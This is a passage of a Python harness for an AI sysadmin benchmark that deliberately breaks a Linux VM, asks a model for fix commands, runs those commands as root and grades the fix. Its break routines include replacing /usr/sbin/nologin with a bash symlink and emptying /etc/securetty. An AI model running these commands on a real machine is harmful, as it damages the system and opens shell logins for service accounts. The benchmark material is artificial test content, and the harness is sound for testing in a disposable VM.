    def validate_adduser():
        result = run_cmd("grep 'nonexistent' /etc/adduser.conf 2>/dev/null")
        return not result["success"]
    
    def cleanup_adduser():
        run_cmd_sudo("mv /etc/adduser.conf.backup /etc/adduser.conf 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Invalid default shell in adduser",
        description="/etc/adduser.conf sets nonexistent default shell.",
        difficulty=4,
        break_system=break_adduser, validate_fix=validate_adduser, cleanup=cleanup_adduser,

    ))
    
    def break_nologin():
        run_cmd_sudo("mv /usr/sbin/nologin /usr/sbin/nologin.backup 2>/dev/null || true")
        run_cmd_sudo("ln -sf /bin/bash /usr/sbin/nologin")
        return {"broken": "nologin replaced with bash (security issue)"}
    
    def validate_nologin():
        result = run_cmd("file /usr/sbin/nologin 2>/dev/null")
        return "symbolic link" not in result.get("stdout", "").lower()
    
    def cleanup_nologin():
        run_cmd_sudo("rm /usr/sbin/nologin 2>/dev/null || true")
        run_cmd_sudo("mv /usr/sbin/nologin.backup /usr/sbin/nologin 2>/dev/null || apt install -y login 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Nologin replaced with bash",
        description="/usr/sbin/nologin is symlinked to bash allowing service account logins.",
        difficulty=5,
        break_system=break_nologin, validate_fix=validate_nologin, cleanup=cleanup_nologin,

    ))
    
    def break_console():
        run_cmd_sudo("cp /etc/securetty /etc/securetty.backup 2>/dev/null || true")
        run_cmd_sudo("echo '' > /etc/securetty 2>/dev/null || true")
        return {"broken": "/etc/securetty empty blocking root console login"}
    
    def validate_console():
        result = run_cmd("cat /etc/securetty 2>/dev/null | grep -v '^$' | wc -l")
        count = int(result.get("stdout", "0").strip() or "0")
        return count > 0 or not run_cmd("test -f /etc/securetty")["success"]
    
    def cleanup_console():
        run_cmd_sudo("mv /etc/securetty.backup /etc/securetty 2>/dev/null || rm /etc/securetty 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Empty /etc/securetty",
        description="/etc/securetty is empty blocking root console access.",
        difficulty=4,
        break_system=break_console, validate_fix=validate_console, cleanup=cleanup_console,

    ))
    
    def break_modules():
        run_cmd_sudo("cp /etc/modules /etc/modules.backup 2>/dev/null || true")
        run_cmd_sudo("echo 'nonexistent_module' >> /etc/modules")
        return {"broken": "/etc/modules has nonexistent module"}
    
    def validate_modules():
        result = run_cmd("grep 'nonexistent_module' /etc/modules 2>/dev/null")
        return not result["success"]
    
    def cleanup_modules():
        run_cmd_sudo("mv /etc/modules.backup /etc/modules 2>/dev/null || sed -i '/nonexistent_module/d' /etc/modules")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Invalid module in /etc/modules",
        description="/etc/modules tries to load nonexistent kernel module.",
        difficulty=4,
        break_system=break_modules, validate_fix=validate_modules, cleanup=cleanup_modules,

    ))
    
    def break_modprobe():
        run_cmd_sudo("mkdir -p /etc/modprobe.d")
        run_cmd_sudo("echo 'blacklist loop' > /etc/modprobe.d/99-broken.conf")
        return {"broken": "loop module blacklisted in modprobe.d"}
    
    def validate_modprobe():
        result = run_cmd("test -f /etc/modprobe.d/99-broken.conf")
        return not result["success"]
    
    def cleanup_modprobe():
        run_cmd_sudo("rm /etc/modprobe.d/99-broken.conf 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.CHAOS_ENGINEERING,
        name="Essential module blacklisted",
        description="Loop module is blacklisted in /etc/modprobe.d.",
        difficulty=4,
        break_system=break_modprobe, validate_fix=validate_modprobe, cleanup=cleanup_modprobe,

    ))
    

    priority_order = {
        Category.DEPENDENCY_HELL: 1,
        Category.KERNEL_SURGERY: 2,
        Category.FILESYSTEM_DESTRUCTION: 3,
        Category.OODA_LOGIC: 4,
        Category.RED_TEAM: 5,
        Category.CHAOS_ENGINEERING: 6,
    }
    
    scenarios.sort(key=lambda s: (priority_order.get(s.category, 99), s.id))
    
    for i, scenario in enumerate(scenarios, start=1):
        scenario.id = i
    
    return scenarios


class ZAIStressTest:
    """Main stress test executor with real system breaking and AI fixing."""
    
    def __init__(self, checkpoint_path: Optional[str] = None, category_filter: Optional[Category] = None):
        self.api_manager = APIKeyManager(API_KEYS)
        self.ui = TerminalUI()
        self.category_filter = category_filter
        cat_name = category_filter.value if category_filter else None
        self.logger = StressTestLogger(category_filter=cat_name)
        
        all_scenarios = create_test_scenarios()
        if category_filter:
            self.scenarios = [s for s in all_scenarios if s.category == category_filter]
            for i, s in enumerate(self.scenarios, start=1):
                s.id = i
        else:
            self.scenarios = all_scenarios
        
        self.session = None
        self.current_index = 0
        
        if checkpoint_path and os.path.exists(checkpoint_path):
            self._load_checkpoint(checkpoint_path)
        else:
            self._init_session()
    
    def _init_session(self):
        self.session = TestSession(
            start_time=datetime.datetime.now().isoformat(),
            total_scenarios=len(self.scenarios)
        )
        if self.category_filter:
            self.session.category_stats[self.category_filter.value] = {
                "total": len(self.scenarios), "passed": 0, "failed": 0, 
                "self_healing": 0, "total_time": 0.0
            }
        else:
            for cat in Category:
                self.session.category_stats[cat.value] = {
                    "total": 0, "passed": 0, "failed": 0, 
                    "self_healing": 0, "total_time": 0.0
                }
            for s in self.scenarios:
                self.session.category_stats[s.category.value]["total"] += 1
        self.ui.set_total(len(self.scenarios))
    
    def _load_checkpoint(self, path: str):
        try:
            with open(path, "rb") as f:
                data = pickle.load(f)
            self.session = data["session"]
            self.current_index = data["current_index"]
            self.ui.set_total(len(self.scenarios))
            print(f"{Fore.GREEN}✓ Checkpoint loaded. Resuming from scenario {self.current_index + 1}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}✗ Failed to load checkpoint: {e}{Style.RESET_ALL}")
            self._init_session()
    
    def _build_ai_prompt(self, scenario: TestScenario, error_context: str = "", system_info: str = "") -> str:
        prompt = f"""You are ZAI Shell, an advanced AI system administrator. You are being tested on fixing real system problems.

CURRENT PROBLEM:
================
Name: {scenario.name}
Category: {scenario.category.value}
Description: {scenario.description}

SYSTEM STATE:
=============
{system_info if system_info else "Ubuntu Linux VM"}

YOUR TASK:
==========
Analyze this problem and provide Linux commands to fix it.

RESPONSE FORMAT (JSON):
======================
{{
    "analysis": "Your analysis of what's wrong",
    "commands": [
        {{"cmd": "command to run", "sudo": true/false, "explanation": "why this command"}},
        ...
    ],
    "verification": "How to verify the fix"
}}

CRITICAL RULES:
===============
- NEVER use reboot, shutdown, restart, poweroff, halt, init 0, init 6
- NEVER restart the entire system - fix problems WITHOUT rebooting
- Do NOT use 'systemctl reboot' or any system restart command
- Fix the problem directly using file edits, package installs, service restarts (individual services OK)
- Use real Linux commands that will be executed
- Use sudo: true for commands needing root
- Be specific and complete
- Commands will run on Ubuntu 22.04+
- If you think reboot is needed, find an alternative solution instead"""

        if error_context:
            prompt += f"""

SELF-HEALING CONTEXT:
====================
Previous attempt FAILED with:
{error_context}

You MUST try a DIFFERENT approach. Previous commands didn't work.
Think of alternative solutions."""
        
        return prompt
    
    def _execute_ai_commands(self, response_text: str) -> Tuple[bool, List[Dict], str]:
        """Parse AI response and execute commands."""
        commands_executed = []
        last_error = ""
        
        try:
            json_match = re.search(r'\{[\s\S]*\}', response_text)
            if not json_match:
                return False, [], "Could not parse JSON response"
            
            data = json.loads(json_match.group())
            commands = data.get("commands", [])
            
            if not commands:
                return False, [], "No commands in response"
            
            for cmd_data in commands:
                cmd = cmd_data.get("cmd", "")
                use_sudo = cmd_data.get("sudo", False)
                
                if not cmd:
                    continue
                
                if use_sudo:
                    result = run_cmd_sudo(cmd)
                else:
                    result = run_cmd(cmd)
                
                cmd_result = {
                    "command": cmd,
                    "sudo": use_sudo,
                    "success": result["success"],
                    "stdout": result.get("stdout", "")[:500],
                    "stderr": result.get("stderr", "")[:500],
                    "explanation": cmd_data.get("explanation", "")
                }
                commands_executed.append(cmd_result)
                self.logger.log_command(cmd, result)
                
                if not result["success"]:
                    last_error = result.get("stderr", "") or result.get("error", "Command failed")
            
            return True, commands_executed, last_error
            
        except json.JSONDecodeError as e:
            return False, [], f"JSON parse error: {e}"
        except Exception as e:
            return False, [], f"Execution error: {e}"
    
    def _run_scenario(self, scenario: TestScenario) -> TestResult:
        """Run a single test scenario."""
        start_time = time.time()
        healing_attempts = []
        commands_executed = []
        self_healing_count = 0
        success = False
        error_message = ""
        ai_response = ""
        break_output = ""
        
        self.logger.log(f"Breaking system for: {scenario.name}")
        try:
            break_result = scenario.break_system()
            break_output = json.dumps(break_result)
            self.logger.log(f"System broken: {break_output}")
        except Exception as e:
            self.logger.log(f"Error breaking system: {e}", "ERROR")
            break_output = f"Break error: {e}"
        
        time.sleep(1)
        
        error_context = ""
        for attempt in range(MAX_SELF_HEALING + 1):
            self.ui.update(
                self.current_index + 1,
                scenario.category.value,
                scenario.name,
                self.session.successful_scenarios,
                self.session.failed_scenarios,
                self.session.total_self_healing_count,
                f"Attempt {attempt + 1}/{MAX_SELF_HEALING + 1}"
            )
            
            sys_info_result = run_cmd("uname -a && cat /etc/os-release | head -3")
            sys_info = sys_info_result.get("stdout", "")
            
            prompt = self._build_ai_prompt(scenario, error_context, sys_info)
            ai_response = self.api_manager.generate(prompt)
            
            if self.api_manager.all_keys_exhausted():
                self.session.api_quota_exhausted = True
                error_message = "All API keys exhausted"
                break
            
            if not ai_response:
                error_context = "No response from AI"
                healing_attempts.append({
                    "attempt": attempt + 1,
                    "error": error_context,
                    "success": False
                })
                if attempt < MAX_SELF_HEALING:
                    self_healing_count += 1
                continue
            
            exec_success, cmds, exec_error = self._execute_ai_commands(ai_response)
            commands_executed.extend(cmds)
            
            healing_attempts.append({
                "attempt": attempt + 1,
                "ai_response": ai_response[:1000],
                "commands_run": len(cmds),
                "exec_success": exec_success,
                "error": exec_error if exec_error else None
            })
            
            time.sleep(0.5)
            try:
                if scenario.validate_fix():
                    success = True
                    self.logger.log(f"✓ Scenario {scenario.id} PASSED after {attempt + 1} attempt(s)")
                    break
                else:
                    error_context = exec_error or "Validation failed - fix didn't work"
                    if attempt < MAX_SELF_HEALING:
                        self_healing_count += 1
                        self.logger.log(f"Validation failed, trying self-healing (attempt {attempt + 2})")
            except Exception as e:
                error_context = f"Validation error: {e}"
                if attempt < MAX_SELF_HEALING:
                    self_healing_count += 1
        
        if not success:
            error_message = error_context or "Max attempts reached"
            self.logger.log(f"✗ Scenario {scenario.id} FAILED: {error_message}", "ERROR")
        
        if scenario.cleanup:
            try:
                scenario.cleanup()
            except Exception as e:
                self.logger.log(f"Cleanup error: {e}", "WARNING")
        
        execution_time = time.time() - start_time
        
        return TestResult(
            scenario_id=scenario.id,
            scenario_name=scenario.name,
            category=scenario.category.value,
            success=success,
            self_healing_count=self_healing_count,
            healing_attempts=healing_attempts,
            commands_executed=commands_executed,
            execution_time=execution_time,
            error_message=error_message,
            ai_response=ai_response[:2000] if ai_response else "",
            break_output=break_output,
            timestamp=datetime.datetime.now().isoformat()
        )
    
    def run(self):
        """Execute the stress test."""
        print(f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════════════╗
║                         ⚠️  WARNING ⚠️                                ║
║                                                                      ║
║   This stress test WILL BREAK your system intentionally!             ║
║   Run ONLY in a VM that you can reset/snapshot!                      ║
║                                                                      ║
║   The test will:                                                     ║
║   • Remove/corrupt system files                                      ║
║   • Stop critical services                                           ║
║   • Modify network configuration                                     ║
║   • Change file permissions                                          ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")
        
        confirm = input(f"{Fore.YELLOW}Type 'YES' to confirm you understand the risks: {Style.RESET_ALL}")
        if confirm != "YES":
            print("Aborting.")
            return
        
        print(f"\n{Fore.GREEN}Starting stress test with {len(self.scenarios)} scenarios...{Style.RESET_ALL}\n")
        time.sleep(2)
        
        try:
            for i in range(self.current_index, len(self.scenarios)):
                if self.session.api_quota_exhausted:
                    print(f"\n{Fore.RED}API quota exhausted. Stopping.{Style.RESET_ALL}")
                    break
                
                scenario = self.scenarios[i]
                self.current_index = i
                
                result = self._run_scenario(scenario)
                
                self.session.results.append(result)
                self.session.completed_scenarios += 1
                self.session.total_self_healing_count += result.self_healing_count
                self.session.total_commands_executed += len(result.commands_executed)
                
                cat_stats = self.session.category_stats[result.category]
                if result.success:
                    self.session.successful_scenarios += 1
                    cat_stats["passed"] += 1
                else:
                    self.session.failed_scenarios += 1
                    cat_stats["failed"] += 1
                    self.logger.add_failed(result)
                
                cat_stats["self_healing"] += result.self_healing_count
                cat_stats["total_time"] += result.execution_time
                
                self.logger.add_hardest(result)
                self.logger.add_training_data(result)
                
                if (i + 1) % 5 == 0:
                    self.session.total_duration = time.time() - self.ui.start_time
                    self.logger.save_checkpoint(self.session, i + 1, self.scenarios)
                    self.logger.save_session(self.session)
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Interrupted. Saving progress...{Style.RESET_ALL}")
        except Exception as e:
            print(f"\n{Fore.RED}Error: {e}{Style.RESET_ALL}")
            traceback.print_exc()
        finally:
            self._finalize()
    
    def _finalize(self):
        self.session.end_time = datetime.datetime.now().isoformat()
        self.session.total_duration = time.time() - self.ui.start_time
        
        self.logger.save_session(self.session)
        self.logger.save_checkpoint(self.session, self.current_index, self.scenarios)
        
        self._print_summary()
    
    def _print_summary(self):
        duration = datetime.timedelta(seconds=int(self.session.total_duration))
        
        print(f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════╗
║                    STRESS TEST COMPLETE                              ║
╠══════════════════════════════════════════════════════════════════════╣{Style.RESET_ALL}

{Fore.WHITE}OVERALL RESULTS:{Style.RESET_ALL}
  Duration:           {duration}
  Scenarios:          {self.session.completed_scenarios} / {self.session.total_scenarios}
  {Fore.GREEN}Passed:             {self.session.successful_scenarios}{Style.RESET_ALL}
  {Fore.RED}Failed:             {self.session.failed_scenarios}{Style.RESET_ALL}
  {Fore.YELLOW}Self-Healing:       {self.session.total_self_healing_count} attempts{Style.RESET_ALL}
  {Fore.MAGENTA}Success Rate:       {self.session.success_rate:.1f}%{Style.RESET_ALL}
  Commands Executed:  {self.session.total_commands_executed}

{Fore.WHITE}CATEGORY BREAKDOWN:{Style.RESET_ALL}""")
        
        for cat_name, stats in self.session.category_stats.items():
            if stats["total"] > 0:
                tested = stats["passed"] + stats["failed"]
                rate = (stats["passed"] / tested * 100) if tested > 0 else 0
                print(f"""
  {cat_name}:
    Tested: {tested}/{stats['total']}
    Passed: {stats['passed']} | Failed: {stats['failed']}
    Success Rate: {rate:.1f}%
    Self-Healing: {stats['self_healing']}""")
        
        print(f"""
{Fore.WHITE}LOG FILES:{Style.RESET_ALL}
  Results:    {self.logger.main_log}
  Failed:     {self.logger.failed_log}
  Hardest:    {self.logger.hardest_log}
  Training:   {self.logger.training_log}
  Commands:   {self.logger.commands_log}
  Checkpoint: {self.logger.checkpoint_file}
""")
        
        if self.session.api_quota_exhausted:
            print(f"{Fore.RED}⚠️  Test stopped due to API quota exhaustion{Style.RESET_ALL}")
        
        print(f"{Fore.CYAN}{'═' * 72}{Style.RESET_ALL}")


def main():
    import argparse
    parser = argparse.ArgumentParser(description="ZAI Shell Doomsday Stress Test v2.0")
    parser.add_argument("--resume", type=str, help="Resume from checkpoint file")
    parser.add_argument("--list", action="store_true", help="List all scenarios")
    parser.add_argument("--category", "-c", type=int, help="Run only specific category (1-6)")
    args = parser.parse_args()
    
    if args.list:
        scenarios = create_test_scenarios()
        print(f"\n{Fore.CYAN}Available Test Scenarios ({len(scenarios)} total):{Style.RESET_ALL}\n")
        for s in scenarios:
            print(f"  [{s.id:2d}] [{s.category.value:25s}] {s.name}")
        return
    
    print(f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════╗
║        ZAI SHELL "DOOMSDAY" STRESS TEST v2.0                         ║
║        REAL SYSTEM BREAKING & FIXING TEST                            ║
╠══════════════════════════════════════════════════════════════════════╣
║  This test will:                                                     ║
║    1. Intentionally BREAK your system                                ║
║    2. Ask AI to FIX the problem                                      ║
║    3. VALIDATE if the fix worked                                     ║
║    4. Generate AI TRAINING DATA from successful fixes                ║
╠══════════════════════════════════════════════════════════════════════╣
║  Categories:                                                         ║
║    1. Dependency Hell          - Package/library issues              ║
║    2. Kernel & Service Surgery - Systemd, processes, kernel          ║
║    3. Filesystem Destruction   - Permissions, mounts, files          ║
║    4. OODA Logic               - Multi-step complex problems         ║
║    5. Red Team / Security      - Security misconfigurations          ║
║    6. Chaos Engineering        - Deep system file recovery           ║
╚══════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")
    
    scenarios = create_test_scenarios()
    print(f"{Fore.WHITE}Loaded {len(scenarios)} test scenarios{Style.RESET_ALL}")
    
    category_list = list(Category)
    for i, cat in enumerate(category_list, start=1):
        count = sum(1 for s in scenarios if s.category == cat)
        print(f"  {i}. {cat.value}: {count} scenarios")
    
    selected_category = None
    
    if args.category:
        if 1 <= args.category <= len(category_list):
            selected_category = category_list[args.category - 1]
            print(f"\n{Fore.GREEN}Selected category: {selected_category.value}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Invalid category number. Running all categories.{Style.RESET_ALL}")
    else:
        print(f"\n{Fore.YELLOW}Select category to test (1-{len(category_list)}) or press ENTER for all:{Style.RESET_ALL}")
        choice = input("> ").strip()
        
        if choice.isdigit():
            choice_num = int(choice)
            if 1 <= choice_num <= len(category_list):
                selected_category = category_list[choice_num - 1]
                print(f"\n{Fore.GREEN}Selected: {selected_category.value}{Style.RESET_ALL}")
        
        if selected_category:
            filtered_count = sum(1 for s in scenarios if s.category == selected_category)
            print(f"{Fore.WHITE}Running {filtered_count} scenarios from '{selected_category.value}'{Style.RESET_ALL}")
        else:
            print(f"{Fore.WHITE}Running all {len(scenarios)} scenarios{Style.RESET_ALL}")
    
    test = ZAIStressTest(checkpoint_path=args.resume, category_filter=selected_category)
    test.run()


if __name__ == "__main__":
    main()
